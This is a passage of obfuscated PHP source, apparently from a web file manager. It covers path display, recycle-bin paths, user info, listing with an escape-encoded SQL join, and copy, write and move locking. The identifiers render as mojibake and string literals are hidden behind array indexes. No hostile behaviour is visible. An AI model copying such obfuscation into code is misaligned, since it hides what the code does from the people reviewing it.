($«÷Ò¯øà[$›• ≥Èæ[538]] != $›≤Æó™) { $´˝ñ–˙[$›• ≥Èæ[498]][$›• ≥Èæ[499]] = $´˝ñ–˙[$›• ≥Èæ[498]][$›• ≥Èæ[499]] & $«÷Ò¯øà[$›• ≥Èæ[498]][$›• ≥Èæ[498]]; } continue; } $µŒ”ÓÃ€ = $this->parentLevelArray($´˝ñ–˙[$›• ≥Èæ[595]]); $–®ÈÓôÓ = array_reverse($µŒ”ÓÃ€); foreach ($–®ÈÓôÓ as $àÚÍõºŒ => $ø— ÛÕ ) { if (!isset($∂î£±ƒ¥[$ø— ÛÕ ])) { continue; } $«÷Ò¯øà = $∂î£±ƒ¥[$ø— ÛÕ ]; $´˝ñ–˙[$›• ≥Èæ[498]][$›• ≥Èæ[591]] = $«÷Ò¯øà; if ($«÷Ò¯øà[$›• ≥Èæ[538]] != $›≤Æó™) { $´˝ñ–˙[$›• ≥Èæ[498]][$›• ≥Èæ[499]] = $´˝ñ–˙[$›• ≥Èæ[498]][$›• ≥Èæ[499]] & $«÷Ò¯øà[$›• ≥Èæ[498]][$›• ≥Èæ[498]]; } $ÙÌá¿≥» = $›• ≥Èæ[12]; $Œ‡ñé›Ù = count($µŒ”ÓÃ€) - $àÚÍõºŒ; for ($∂üÆ„Ïû = 0; $∂üÆ„Ïû < $Œ‡ñé›Ù; $∂üÆ„Ïû++) { if (!isset($ò“ÅÑªº[$µŒ”ÓÃ€[$∂üÆ„Ïû]])) { $ÙÌá¿≥» = $›• ≥Èæ[12]; break; } $ÙÌá¿≥» = $ÙÌá¿≥» . rtrim($ò“ÅÑªº[$µŒ”ÓÃ€[$∂üÆ„Ïû]], $›• ≥Èæ[8]) . $›• ≥Èæ[8]; } $´˝ñ–˙[$›• ≥Èæ[498]][$›• ≥Èæ[592]] = rtrim($ÙÌá¿≥», $›• ≥Èæ[8]) . $›• ≥Èæ[8]; break; } } unset($´˝ñ–˙); } public function groupPathDisplay(&$ÀãìÃèå) { $∏ÚâÔï® =& $_SERVER[ˆë€Ï⁄∂]; if ($ÀãìÃèå[$∏ÚâÔï®[200]] != self::TYPE_GROUP) { return; } $ûåö≤éÆ = Model($∏ÚâÔï®[596])->getInfo($ÀãìÃèå[$∏ÚâÔï®[580]]); $÷ßÊ–üë = $this->parentLevelArray($ûåö≤éÆ[$∏ÚâÔï®[595]]); $ËÀ®ëÜÜ = $∏ÚâÔï®[12]; foreach ($÷ßÊ–üë as $˚ÎÙëâﬁ) { $´·´“Ë€ = Model($∏ÚâÔï®[596])->getInfo($˚ÎÙëâﬁ); $ËÀ®ëÜÜ .= $´·´“Ë€[$∏ÚâÔï®[100]][$∏ÚâÔï®[203]] . $∏ÚâÔï®[50]; } $ÀãìÃèå[$∏ÚâÔï®[597]] = $ûåö≤éÆ[$∏ÚâÔï®[202]]; $ÀãìÃèå[$∏ÚâÔï®[598]] = $ûåö≤éÆ[$∏ÚâÔï®[595]]; $ÀãìÃèå[$∏ÚâÔï®[599]] = $ûåö≤éÆ[$∏ÚâÔï®[600]]; $ÀãìÃèå[$∏ÚâÔï®[601]] = $ËÀ®ëÜÜ . $ûåö≤éÆ[$∏ÚâÔï®[100]][$∏ÚâÔï®[203]]; } protected function _listAppendPath(&$Û£ï˜â∆, $Óãü˛π® = false) { $éä”¨äê =& $_SERVER[ˆë€Ï⁄∂]; static $ø–˜‹‚ä = array(); $≥”Ÿóä = array(); $È¶ÃØ˘∏ = array(); if ($Óãü˛π®) { return $ø–˜‹‚ä; } foreach ($Û£ï˜â∆ as &$⁄áõØà¢) { $´‡±◊¶¬ = $⁄áõØà¢[$éä”¨äê[203]]; if ($⁄áõØà¢[$éä”¨äê[496]] == $éä”¨äê[101] && $⁄áõØà¢[$éä”¨äê[202]] != 0) { $ø–˜‹‚ä[$´‡±◊¶¬] = $⁄áõØà¢[$éä”¨äê[32]]; } if ($⁄áõØà¢[$éä”¨äê[496]] == $éä”¨äê[101] && $⁄áõØà¢[$éä”¨äê[202]] == 0) { $ø–˜‹‚ä[$´‡±◊¶¬] = $this->_listAppendPathRoot($⁄áõØà¢, array()); } if (isset($È¶ÃØ˘∏[$⁄áõØà¢[$éä”¨äê[595]]])) { continue; } $È¶ÃØ˘∏[$⁄áõØà¢[$éä”¨äê[595]]] = !0; $‡ƒÍâå≤ = $this->parentLevelArray($⁄áõØà¢[$éä”¨äê[595]]); foreach ($‡ƒÍâå≤ as $ø˛€»¶® => $≈Ö’ßÑÆ) { if (isset($ø–˜‹‚ä[$≈Ö’ßÑÆ])) { continue; } if ($ø˛€»¶® == 0) { $ø–˜‹‚ä[$≈Ö’ßÑÆ] = $this->_listAppendPathRoot($⁄áõØà¢, $‡ƒÍâå≤); } if ($ø˛€»¶® != 0) { $≥”Ÿóä[] = $≈Ö’ßÑÆ; } } } unset($⁄áõØà¢); $≥”Ÿóä = array_unique($≥”Ÿóä); if (count($≥”Ÿóä) > 0) { $£ØóŒ˜Ì = array($éä”¨äê[502] => array($éä”¨äê[503], $≥”Ÿóä)); if (count($≥”Ÿóä) == 1) { $îúî∫õë = $this->sourceInfo($≥”Ÿóä[0]); $óŸ∏Äñï = is_array($îúî∫õë) ? array($îúî∫õë) : !1; } else { $óŸ∏Äñï = $this->field($éä”¨äê[602])->where($£ØóŒ˜Ì)->select(); } if (!$óŸ∏Äñï) { $óŸ∏Äñï = array(); } foreach ($óŸ∏Äñï as $Ï∑Û±Å‡) { $ø–˜‹‚ä[$Ï∑Û±Å‡[$éä”¨äê[203]]] = $Ï∑Û±Å‡[$éä”¨äê[32]]; } } $∆Ô…Æ˝¯ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ø‰Üóïµ = array(); foreach ($Û£ï˜â∆ as &$⁄áõØà¢) { $∞≤∫˘ãæ = $⁄áõØà¢[$éä”¨äê[595]]; $ãßäé¸◊ = $éä”¨äê[12]; if (isset($Ø‰Üóïµ[$∞≤∫˘ãæ])) { $ãßäé¸◊ = $Ø‰Üóïµ[$∞≤∫˘ãæ]; } else { $‡ƒÍâå≤ = $this->parentLevelArray($⁄áõØà¢[$éä”¨äê[595]]); foreach ($‡ƒÍâå≤ as $ø˛€»¶® => $≈Ö’ßÑÆ) { if (isset($ø–˜‹‚ä[$≈Ö’ßÑÆ])) { $ãßäé¸◊ .= $ø–˜‹‚ä[$≈Ö’ßÑÆ] . $éä”¨äê[8]; } } $Ø‰Üóïµ[$∞≤∫˘ãæ] = $ãßäé¸◊; } $ãßäé¸◊ .= $⁄áõØà¢[$éä”¨äê[32]]; if ($⁄áõØà¢[$éä”¨äê[496]] == $éä”¨äê[101]) { $ãßäé¸◊ .= $éä”¨äê[8]; } $⁄áõØà¢[$éä”¨äê[593]] = str_replace($éä”¨äê[266], $éä”¨äê[8], $ãßäé¸◊); if ($⁄áõØà¢[$éä”¨äê[202]] == $éä”¨äê[240]) { $⁄áõØà¢[$éä”¨äê[32]] = trim($ø–˜‹‚ä[$⁄áõØà¢[$éä”¨äê[203]]], $éä”¨äê[8]); $⁄áõØà¢[$éä”¨äê[593]] = $⁄áõØà¢[$éä”¨äê[32]] . $éä”¨äê[8]; } if (intval($⁄áõØà¢[$éä”¨äê[200]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($⁄áõØà¢, $‡ƒÍâå≤, $∆Ô…Æ˝¯); } } unset($⁄áõØà¢); return $Û£ï˜â∆; } private function _listAppendPathRecycle(&$”ﬂ”•¶˝, $ﬁﬁ¥Ëà˘, $…˝ÃÚ÷à) { $µªü˚¿Ü =& $_SERVER[ˆë€Ï⁄∂]; if (!in_array($…˝ÃÚ÷à, $ﬁﬁ¥Ëà˘) && $”ﬂ”•¶˝[$µªü˚¿Ü[203]] != $…˝ÃÚ÷à) { return; } $¢àœ’¸˘ = explode($µªü˚¿Ü[8], trim($”ﬂ”•¶˝[$µªü˚¿Ü[593]], $µªü˚¿Ü[8])); $£Äª®÷œ = implode($µªü˚¿Ü[8], array_slice($¢àœ’¸˘, 2)); $”ﬂ”•¶˝[$µªü˚¿Ü[593]] = $µªü˚¿Ü[8] . LNG($µªü˚¿Ü[603]) . $µªü˚¿Ü[8] . ltrim($£Äª®÷œ, $µªü˚¿Ü[8]); $”ﬂ”•¶˝[$µªü˚¿Ü[595]] = $µªü˚¿Ü[604] . implode($µªü˚¿Ü[50], array_slice($ﬁﬁ¥Ëà˘, 1)) . $µªü˚¿Ü[50]; if ($”ﬂ”•¶˝[$µªü˚¿Ü[203]] == $…˝ÃÚ÷à) { $”ﬂ”•¶˝[$µªü˚¿Ü[595]] = $µªü˚¿Ü[604]; $”ﬂ”•¶˝[$µªü˚¿Ü[202]] = $µªü˚¿Ü[240]; $”ﬂ”•¶˝[$µªü˚¿Ü[32]] = LNG($µªü˚¿Ü[603]); } $”ﬂ”•¶˝[$µªü˚¿Ü[605]] = $µªü˚¿Ü[606]; } protected function _listAppendPathRoot(&$ Í˜˚ “, $ÆŸˆÈÜ—) { $Ÿ˜ÍÛ∂é =& $_SERVER[ˆë€Ï⁄∂]; static $õÛŒû‡Û = false; static $ À÷Æ’¡ = false; $Ç≠é´Û† = $Ÿ˜ÍÛ∂é[12]; if ($ Í˜˚ “[$Ÿ˜ÍÛ∂é[200]] == self::TYPE_USER) { if ($ Í˜˚ “[$Ÿ˜ÍÛ∂é[580]] == USER_ID) { $Ç≠é´Û† = LNG($Ÿ˜ÍÛ∂é[607]); if ($õÛŒû‡Û === !1) { $⁄ﬁ¡Ã©æ = Model($Ÿ˜ÍÛ∂é[608])->getInfoFull(USER_ID); $õÛŒû‡Û = _get($⁄ﬁ¡Ã©æ, $Ÿ˜ÍÛ∂é[609], $Ÿ˜ÍÛ∂é[12]); } if ($ À÷Æ’¡ === !1) { $⁄ﬁ¡Ã©æ = Model($Ÿ˜ÍÛ∂é[608])->getInfoFull(USER_ID); $ À÷Æ’¡ = _get($⁄ﬁ¡Ã©æ, $Ÿ˜ÍÛ∂é[610], $Ÿ˜ÍÛ∂é[12]); } if ($ÆŸˆÈÜ— && $ÆŸˆÈÜ—[0] == $õÛŒû‡Û || !$ÆŸˆÈÜ— && $ Í˜˚ “[$Ÿ˜ÍÛ∂é[203]] == $õÛŒû‡Û) { $Ç≠é´Û† = LNG($Ÿ˜ÍÛ∂é[611]); $ Í˜˚ “[$Ÿ˜ÍÛ∂é[612]] = $Ÿ˜ÍÛ∂é[613]; } if ($ÆŸˆÈÜ— && $ÆŸˆÈÜ—[0] == $ À÷Æ’¡ || !$ÆŸˆÈÜ— && $ Í˜˚ “[$Ÿ˜ÍÛ∂é[203]] == $ À÷Æ’¡) { $Ç≠é´Û† = $Ç≠é´Û† . $Ÿ˜ÍÛ∂é[614] . LNG($Ÿ˜ÍÛ∂é[615]); } if (!$ÆŸˆÈÜ—) { $ Í˜˚ “[$Ÿ˜ÍÛ∂é[32]] = $Ç≠é´Û†; } } else { $⁄ﬁ¡Ã©æ = Model($Ÿ˜ÍÛ∂é[608])->getInfoFull($ Í˜˚ “[$Ÿ˜ÍÛ∂é[580]]); $òﬁˆºπ¶ = _get($⁄ﬁ¡Ã©æ, $Ÿ˜ÍÛ∂é[610], $Ÿ˜ÍÛ∂é[12]); $ Í˜˚ “[$Ÿ˜ÍÛ∂é[616]] = Model($Ÿ˜ÍÛ∂é[588])->getInfoSimpleOuter($ Í˜˚ “[$Ÿ˜ÍÛ∂é[580]]); $Ç≠é´Û† = LNG($Ÿ˜ÍÛ∂é[617]) . $Ÿ˜ÍÛ∂é[186] . $ Í˜˚ “[$Ÿ˜ÍÛ∂é[616]][$Ÿ˜ÍÛ∂é[32]] . $Ÿ˜ÍÛ∂é[188]; if ($ÆŸˆÈÜ— && $ÆŸˆÈÜ—[0] == $òﬁˆºπ¶ || !$ÆŸˆÈÜ— && $ Í˜˚ “[$Ÿ˜ÍÛ∂é[203]] == $òﬁˆºπ¶) { $Ç≠é´Û† = LNG($Ÿ˜ÍÛ∂é[617]) . $Ÿ˜ÍÛ∂é[618] . $ Í˜˚ “[$Ÿ˜ÍÛ∂é[616]][$Ÿ˜ÍÛ∂é[32]] . $Ÿ˜ÍÛ∂é[614] . LNG($Ÿ˜ÍÛ∂é[615]) . $Ÿ˜ÍÛ∂é[188]; } } } else { if ($ Í˜˚ “[$Ÿ˜ÍÛ∂é[200]] == self::TYPE_GROUP) { $∏‹Ô∏„Ø = Model($Ÿ˜ÍÛ∂é[596])->getInfoSimple($ Í˜˚ “[$Ÿ˜ÍÛ∂é[580]]); $Ç≠é´Û† = $∏‹Ô∏„Ø[$Ÿ˜ÍÛ∂é[32]]; } else { if ($ Í˜˚ “[$Ÿ˜ÍÛ∂é[200]] == self::TYPE_SYSTEM) { $Ç≠é´Û† = $Ÿ˜ÍÛ∂é[619]; } } } $Ç≠é´Û† = $Ç≠é´Û† ? $Ÿ˜ÍÛ∂é[8] . $Ç≠é´Û† . $Ÿ˜ÍÛ∂é[8] : $Ÿ˜ÍÛ∂é[8]; return $Ç≠é´Û†; } protected function _listAppendUser(&$¡È≥’€≈) { $¨∆ﬂ·çΩ =& $_SERVER[ˆë€Ï⁄∂]; $ﬂÆË÷óØ = array_to_keyvalue($¡È≥’€≈, $¨∆ﬂ·çΩ[12], $¨∆ﬂ·çΩ[538]); $ËÕﬁªòÙ = array_to_keyvalue($¡È≥’€≈, $¨∆ﬂ·çΩ[12], $¨∆ﬂ·çΩ[540]); $˘˘´Û¨ç = array_merge($ﬂÆË÷óØ, $ËÕﬁªòÙ); $≤õ∆„Ë¶ = Model($¨∆ﬂ·çΩ[608])->userListInfo($˘˘´Û¨ç); foreach ($¡È≥’€≈ as &$ˆ™Ôπ¬¡) { $ŒÊ…È¨ñ = $ˆ™Ôπ¬¡[$¨∆ﬂ·çΩ[538]]; $ˆ™Ôπ¬¡[$¨∆ﬂ·çΩ[538]] = $≤õ∆„Ë¶[$ŒÊ…È¨ñ] ? $≤õ∆„Ë¶[$ŒÊ…È¨ñ] : !1; $ŒÊ…È¨ñ = $ˆ™Ôπ¬¡[$¨∆ﬂ·çΩ[540]]; $ˆ™Ôπ¬¡[$¨∆ﬂ·çΩ[540]] = $≤õ∆„Ë¶[$ŒÊ…È¨ñ] ? $≤õ∆„Ë¶[$ŒÊ…È¨ñ] : !1; if (_get($ˆ™Ôπ¬¡, $¨∆ﬂ·çΩ[620], 0)) { $Ç«»‡ù  = $GLOBALS[$¨∆ﬂ·çΩ[6]][$¨∆ﬂ·çΩ[102]][$¨∆ﬂ·çΩ[621]]; if ($ˆ™Ôπ¬¡[$¨∆ﬂ·çΩ[550]][$¨∆ﬂ·çΩ[622]] <= time() - $Ç«»‡ù ) { $this->metaSet($ˆ™Ôπ¬¡[$¨∆ﬂ·çΩ[203]], $¨∆ﬂ·çΩ[623], null); $this->metaSet($ˆ™Ôπ¬¡[$¨∆ﬂ·çΩ[203]], $¨∆ﬂ·çΩ[622], null); unset($ˆ™Ôπ¬¡[$¨∆ﬂ·çΩ[550]][$¨∆ﬂ·çΩ[623]]); continue; } $…¯≈Òµ = $ˆ™Ôπ¬¡[$¨∆ﬂ·çΩ[550]][$¨∆ﬂ·çΩ[623]]; $ˆ™Ôπ¬¡[$¨∆ﬂ·çΩ[550]][$¨∆ﬂ·çΩ[624]] = Model($¨∆ﬂ·çΩ[608])->getInfoSimpleOuter($…¯≈Òµ); } } unset($ˆ™Ôπ¬¡); } public function parentLevelArray($ﬂ€ƒùŒà) { $Ø˜±öÔø =& $_SERVER[ˆë€Ï⁄∂]; $ﬂ€ƒùŒà = explode($Ø˜±öÔø[50], trim($ﬂ€ƒùŒà, $Ø˜±öÔø[50])); return array_remove_value($ﬂ€ƒùŒà, $Ø˜±öÔø[240]); } public function listAll($ß›≈Íã£) { $ÄÌ◊„∂é =& $_SERVER[ˆë€Ï⁄∂]; $Ω–Œõ¯¡ = $this->sourceInfo($ß›≈Íã£); $πú◊ñôç = array($ÄÌ◊„∂é[625] => array($ÄÌ◊„∂é[626], $Ω–Œõ¯¡[$ÄÌ◊„∂é[595]] . $ß›≈Íã£ . $ÄÌ◊„∂é[627]), $ÄÌ◊„∂é[628] => 0); $ÖÆîÅ«ÿ = $ÄÌ◊„∂é[629]; $∏Ôºä√⁄ = "\114\x45\x46\124\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\x66\151\x6c\145\40\x66\x69\x6c\145\40\x6f\156\40\163\157\165\162\143\145\56\146\151\x6c\145\111\x44\40\75\x20\x66\x69\x6c\145\x2e\x66\151\154\145\111\x44"; $´ôﬂç‹∏ = $this->alias($ÄÌ◊„∂é[530])->field($ÖÆîÅ«ÿ)->where($πú◊ñôç)->join($∏Ôºä√⁄)->select(); $this->_listAppendAuth($´ôﬂç‹∏); $this->_listAppendUser($´ôﬂç‹∏); $this->_listAppendPath($´ôﬂç‹∏); $´ôﬂç‹∏ = array_to_keyvalue($´ôﬂç‹∏, $ÄÌ◊„∂é[203]); $áã°ÎÔà = "\57{$Ω–Œõ¯¡[$ÄÌ◊„∂é[32]]}\x2f"; $áã°ÎÔà = $áã°ÎÔà == $ÄÌ◊„∂é[266] ? $ÄÌ◊„∂é[8] : $áã°ÎÔà; $Çà˚®É⁄ = array(); foreach ($´ôﬂç‹∏ as $∞ÙˆÿÆÚ => $ﬁÕ¸Òú‡) { $≥˘ñèµø = $this->parentLevelArray($ﬁÕ¸Òú‡[$ÄÌ◊„∂é[595]]); array_shift($≥˘ñèµø); $∆öï÷Å™ = $áã°ÎÔà; for ($äèÜ§ı√ = 0; $äèÜ§ı√ < count($≥˘ñèµø); $äèÜ§ı√++) { $∆öï÷Å™ .= $´ôﬂç‹∏[$≥˘ñèµø[$äèÜ§ı√]][$ÄÌ◊„∂é[32]] . $ÄÌ◊„∂é[8]; } $∆öï÷Å™ .= $ﬁÕ¸Òú‡[$ÄÌ◊„∂é[32]]; if ($ﬁÕ¸Òú‡[$ÄÌ◊„∂é[496]]) { $∆öï÷Å™ .= $ÄÌ◊„∂é[8]; } $î∆ùñ°‘ = array($ÄÌ◊„∂é[506] => str_replace($ÄÌ◊„∂é[266], $ÄÌ◊„∂é[8], str_replace($ÄÌ◊„∂é[266], $ÄÌ◊„∂é[8], str_replace($ÄÌ◊„∂é[266], $ÄÌ◊„∂é[8], $∆öï÷Å™))), $ÄÌ◊„∂é[630] => intval($ﬁÕ¸Òú‡[$ÄÌ◊„∂é[496]]), $ÄÌ◊„∂é[631] => intval($ﬁÕ¸Òú‡[$ÄÌ◊„∂é[89]]), $ÄÌ◊„∂é[98] => intval($ﬁÕ¸Òú‡[$ÄÌ◊„∂é[98]]), $ÄÌ◊„∂é[100] => $this->pathInfoFilter($ﬁÕ¸Òú‡)); if (!$î∆ùñ°‘[$ÄÌ◊„∂é[496]]) { $î∆ùñ°‘[$ÄÌ◊„∂é[552]] = $ﬁÕ¸Òú‡[$ÄÌ◊„∂é[552]]; } $Çà˚®É⁄[] = $î∆ùñ°‘; } $Çà˚®É⁄ = array_sort_by($Çà˚®É⁄, $ÄÌ◊„∂é[97]); return $Çà˚®É⁄; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Í…ÚΩû£) { $›îÈÛîî =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->allowLock()) { return; } $this->_lockCheck($›îÈÛîî[632], $Í…ÚΩû£); $®æﬁ¿…Ô = 1; $this->_lockEvent($Í…ÚΩû£, array($›îÈÛîî[633], $›îÈÛîî[634]), $®æﬁ¿…Ô); $this->_lockParent($Í…ÚΩû£, array($›îÈÛîî[634]), $®æﬁ¿…Ô); $this->_lockEvent($Í…ÚΩû£, array($›îÈÛîî[635], $›îÈÛîî[636]), $®æﬁ¿…Ô); $this->_lockCheckEnd($›îÈÛîî[632], $Í…ÚΩû£); } public function lockCopyEnd($Ì±∫•Ï‚) { $ÂÄ˛»Á‘ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->allowLock()) { return; } $úÊ¡Ä»ﬁ = 0; $this->_lockEvent($Ì±∫•Ï‚, array($ÂÄ˛»Á‘[633], $ÂÄ˛»Á‘[634]), $úÊ¡Ä»ﬁ); $this->_lockParent($Ì±∫•Ï‚, array($ÂÄ˛»Á‘[634]), $úÊ¡Ä»ﬁ); $this->_lockEvent($Ì±∫•Ï‚, array($ÂÄ˛»Á‘[635], $ÂÄ˛»Á‘[636]), $úÊ¡Ä»ﬁ); } public function lockWriteStart($≥ºæ˙ƒ“, $ü¥·‚› = '') { $√ÙêÊÿÎ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->allowLock()) { return; } $this->_lockCheck($√ÙêÊÿÎ[633], $≥ºæ˙ƒ“); $—Ú∆ΩÒ€ = 1; $this->_lockKey($√ÙêÊÿÎ[637] . $≥ºæ˙ƒ“ . $√ÙêÊÿÎ[10] . $ü¥·‚›, $—Ú∆ΩÒ€); $this->_lockEvent($≥ºæ˙ƒ“, array($√ÙêÊÿÎ[632], $√ÙêÊÿÎ[634]), $—Ú∆ΩÒ€); $this->_lockParent($≥ºæ˙ƒ“, array($√ÙêÊÿÎ[632], $√ÙêÊÿÎ[634]), $—Ú∆ΩÒ€); $this->_lockCheckEnd($√ÙêÊÿÎ[633], $≥ºæ˙ƒ“); } public function lockWriteEnd($¶‡äÈíº, $»ŸÉñ≥Ö = '') { $à«§Ä  =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->allowLock()) { return; } $ìﬁåù¬¯ = 0; $this->_lockKey($à«§Ä [637] . $¶‡äÈíº . $à«§Ä [10] . $»ŸÉñ≥Ö, $ìﬁåù¬¯); $this->_lockEvent($¶‡äÈíº, array($à«§Ä [632], $à«§Ä [634]), $ìﬁåù¬¯); $this->_lockParent($¶‡äÈíº, array($à«§Ä [632], $à«§Ä [634]), $ìﬁåù¬¯); } public function lockMoveStart($¶†ªûíƒ) { $·≤Óﬂı∑ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->allowLock()) { return; } $this->_lockCheck($·≤Óﬂı∑[634], $¶†ªûíƒ); $å”π´∆ú = 1; $this->_lockKey($·≤Óﬂı∑[638] . $¶†ªûíƒ, $å”π´∆ú); $this->_lockEvent($¶†ªûíƒ, array($·≤Óﬂı∑[632], $·≤Óﬂı∑[633]), $å”π´∆ú); $this->_lockParent($¶†ªûíƒ, array($·≤Óﬂı∑[632], $·≤Óﬂı∑[634]), $å”π´∆ú); $this->_lockEvent($¶†ªûíƒ, array($·≤Óﬂı∑[639], $·≤Óﬂı∑[635], $·≤Óﬂı∑[636]), $å”π´∆ú); $this->_lockCheckEnd($·≤Óﬂı∑[634], $¶†ªûíƒ); } public function lockMoveEnd($¶ÀÅî≥ê) { $ÎñÅâˆû =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->allowLock()) { return; } $†‚…÷“ß = 0; $this->_lockKey($ÎñÅâˆû[638] . $¶ÀÅî≥ê, $†‚…÷“ß); $this->_lockEvent($¶ÀÅî≥ê, array($ÎñÅâˆû[632], $ÎñÅâˆû[633]), $†‚…÷“ß); $this->_lockParent($¶ÀÅî≥ê, array($ÎñÅâˆû[632], $ÎñÅâˆû[634]), $†‚…÷“ß); $this->_lockEvent($¶ÀÅî≥ê, array($ÎñÅâˆû[639], $ÎñÅâˆû[635], $ÎñÅâˆû[636]), $†‚…÷“ß); } private function _lockCheck($ŒÕ‹Ëâø, $æ¬«µ‚â) { $ºÄ åÀÇ =& $_SERVER[ˆë€Ï⁄∂]; $ø¯Ôò≤¯ = $this->sourceInfo($æ¬«µ‚â); $¶•êô´¶ = $ŒÕ‹Ëâø . $ºÄ åÀÇ[10] . $æ¬«µ‚â; $this->_lockTimeStart[$¶•êô´¶] = timeFloat(); if (!is_array($ø¯Ôò≤¯)) { return; } $òµ€˙µä = LNG($ºÄ åÀÇ[640]); CacheLock::setErrorMsg($ºÄ åÀÇ[186] . htmlspecialchars($ø¯Ôò≤¯[$ºÄ åÀÇ[32]]) . $ºÄ åÀÇ[188] . $òµ€˙µä); $this->_lockKey($¶•êô´¶, 1); $this->_lockKey($¶•êô´¶, 0); $ Å€ÁÙë = array_reverse($this->parentLevelArray($ø¯Ôò≤¯[$ºÄ åÀÇ[595]])); foreach ($ Å€ÁÙë as $–ßé◊ñ–) { $¶•êô´¶ = $ŒÕ‹Ëâø . $ºÄ åÀÇ[641] . $–ßé◊ñ–; if (CacheLock::lockGet($ºÄ åÀÇ[642] . $¶•êô´¶)) { $ø¯Ôò≤¯ = $this->sourceInfo($–ßé◊ñ–); CacheLock::setErrorMsg($ºÄ åÀÇ[186] . htmlspecialchars($ø¯Ôò≤¯[$ºÄ åÀÇ[32]]) . $ºÄ åÀÇ[188] . $òµ€˙µä); $this->_lockKey($¶•êô´¶, 1); $this->_lockKey($¶•êô´¶, 0); } } } private function _lockCheckEnd($Ù–ÁÖë•, $∏πöéÇ€) { $≤®œôÚ± =& $_SERVER[ˆë€Ï⁄∂]; $á∆¶ ∞ = $Ù–ÁÖë• . $≤®œôÚ±[10] . $∏πöéÇ€; CacheLock::setErrorMsg($≤®œôÚ±[465]); if (!isset($this->_lockTimeStart[$á∆¶ ∞])) { return; } $î⁄Ú¢µ‘ = timeFloat() - $this->_lockTimeStart[$á∆¶ ∞]; unset($this->_lockTimeStart[$á∆¶ ∞]); if ($î⁄Ú¢µ‘ > 0.5) { unset(self::$cacheSourceInfo[$≤®œôÚ±[544] . $∏πöéÇ€]); } $˜¬üîçô = $this->sourceInfo($∏πöéÇ€); if (!$˜¬üîçô) { show_json(LNG($≤®œôÚ±[118]), !1); } } private function _lockParent($•¸ƒªÍ§, $ï±ô‡“—, $¯≥õçΩ≈) { if (!$this->autoLockSet) { return; } $…ÁóÍÌ‘ = $this->sourceInfo($•¸ƒªÍ§); if (!is_array($…ÁóÍÌ‘)) { return; } $ªò¡ﬁùß = array_reverse($this->parentLevelArray($…ÁóÍÌ‘[$_SERVER[ˆë€Ï⁄∂][595]])); foreach ($ªò¡ﬁùß as $›ãªì¥Ï) { $this->_lockEvent($›ãªì¥Ï, $ï±ô‡“—, $¯≥õçΩ≈); } } private function _lockEvent($‰ƒ±˚û”, $„ñ◊©ÿ√, $å§ô«∞˙) { $ˆ§ÙÀµá =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->autoLockSet) { return; } foreach ($„ñ◊©ÿ√ as $˙ªæãÿ–) { $«ÆÎËÎ“ = $˙ªæãÿ– . $ˆ§ÙÀµá[10] . $‰ƒ±˚û”; if ($å§ô«∞˙ && CacheLock::lockGet($ˆ§ÙÀµá[642] . $«ÆÎËÎ“)) { continue; } $this->_lockKey($«ÆÎËÎ“, $å§ô«∞˙); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ª±ï§åï, $€»‚√æè = 1) { $ÖÕóíﬁˆ = $_SERVER[ˆë€Ï⁄∂][642] . md5($ª±ï§åï); if ($€»‚√æè) { if (isset(self::$_lockItemArr[$ÖÕóíﬁˆ])) { return; } self::$_lockItemArr[$ÖÕóíﬁˆ] = 1; CacheLock::lock($ÖÕóíﬁˆ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ÖÕóíﬁˆ])) { return; } unset(self::$_lockItemArr[$ÖÕóíﬁˆ]); CacheLock::unlock($ÖÕóíﬁˆ); } } public function isParentOf($‡ëÉ◊çï, $ï˜å≈¸’) { $çÖ†éÍ =& $_SERVER[ˆë€Ï⁄∂]; $¢ÿÍùÚ’ = $this->sourceInfo($‡ëÉ◊çï); $ø÷Í©Í∆ = $this->sourceInfo($ï˜å≈¸’); $≠è◊›≠ = $¢ÿÍùÚ’[$çÖ†éÍ[595]] . $¢ÿÍùÚ’[$çÖ†éÍ[203]] . $çÖ†éÍ[50]; $ﬁπ∑∆õ€ = $ø÷Í©Í∆[$çÖ†éÍ[595]] . $ø÷Í©Í∆[$çÖ†éÍ[203]] . $çÖ†éÍ[50]; $µªÃÛãΩ = strpos($ﬁπ∑∆õ€, $≠è◊›≠) === 0; return $µªÃÛãΩ; } private $targetIsDelete = 0; public function copy($¨ÅÓáÃÒ, $ÄÿÒåà±, $„”Ä≥¿Æ = REPEAT_REPLACE, $µ◊·é°ß = '') { $‡ÏÂ∫ı• =& $_SERVER[ˆë€Ï⁄∂]; $Ç˘®ù¯Á = $this->sourceInfo($¨ÅÓáÃÒ); $Üµ“üôﬁ = $this->sourceInfo($ÄÿÒåà±); if (!$Ç˘®ù¯Á || !$Üµ“üôﬁ || $Üµ“üôﬁ[$‡ÏÂ∫ı•[496]] != $‡ÏÂ∫ı•[101]) { return !1; } if ($this->isParentOf($¨ÅÓáÃÒ, $ÄÿÒåà±)) { return !1; } $È…˜∫Ø˝ = $µ◊·é°ß ? $µ◊·é°ß : $Ç˘®ù¯Á[$‡ÏÂ∫ı•[32]]; $this->lockCopyStart($¨ÅÓáÃÒ); $this->lockWriteStart($ÄÿÒåà±, $È…˜∫Ø˝); $ÀΩï÷–¶ = array($‡ÏÂ∫ı•[643] => array(), $‡ÏÂ∫ı•[644] => array(), $‡ÏÂ∫ı•[645] => array()); $this->targetIsDelete = intval($Ç˘®ù¯Á[$‡ÏÂ∫ı•[516]]); $ç˜º„ÌË = $this->fileNameExistAuto($ÄÿÒåà±, $Ç˘®ù¯Á); $¨‹Öµ¶Ÿ = $this->_copy($¨ÅÓáÃÒ, $ÄÿÒåà±, $„”Ä≥¿Æ, $ÀΩï÷–¶, !0, $µ◊·é°ß); $this->_childrenListClear(); $this->lockCopyEnd($¨ÅÓáÃÒ); $this->lockWriteEnd($ÄÿÒåà±, $È…˜∫Ø˝); if ($Ç˘®ù¯Á[$‡ÏÂ∫ı•[496]] == 